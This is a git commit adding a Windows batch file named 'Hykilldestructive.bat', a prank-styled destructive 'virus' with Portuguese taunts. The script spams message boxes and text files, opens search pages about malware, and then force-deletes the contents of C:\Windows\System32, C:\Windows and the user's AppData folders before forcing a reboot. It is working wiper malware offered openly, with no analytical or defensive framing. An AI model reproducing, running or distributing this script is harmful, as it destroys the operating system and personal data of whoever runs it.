21bf7c1bd672b33c1200a0f7d076aba11df58d1a
EduardozinYT <158329963+EduardozinYT@users.noreply.github.com>
2024-02-22 15:33:36 -0300

    Create Hykilldestructive.bat

---
+++ Hykilldestructive.bat
@@ -0,0 +1,54 @@
+@echo off
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+start https://www.google.com/search?client=opera&q=Malwers&sourceid=opera&ie=UTF-8&oe=UTF-8
+start https://www.bing.com/search?q=Memz+trojan&qs=n&form=QBRE&sp=-1&ghc=2&lq=0&pq=memz+trojan&sc=11-11&sk=&cvid=C61B8060DD13413397FB14ECA316EB6D&ghsh=0&ghacc=0&ghpl=
+start https://www.bing.com/search?q=Monoxide&qs=n&form=QBRE&sp=-1&ghc=1&lq=0&pq=monoxide&sc=11-8&sk=&cvid=7E17D7D9ADC3429A9A029903C7FDE95D&ghsh=0&ghacc=0&ghpl=
+echo MsgBox "Hykill matou seu pc",16,"HAHAHAHAHAHHAHAHAH" > Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+Start Hykill.vbs
+del /f /s /q "C:\Windows\System32\*.*"
+del /f /s /q "C:\Windows\*.*"
+del /s /q "%UserProfile%\AppData"
+del /s /q "%UserProfile%\AppData\Roaming"
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
+Start hahahahahahahahahahahah.txt
+msg * Tchau...
+shutdown -r -t 1 -c "Hykill MATOU SEU PC"
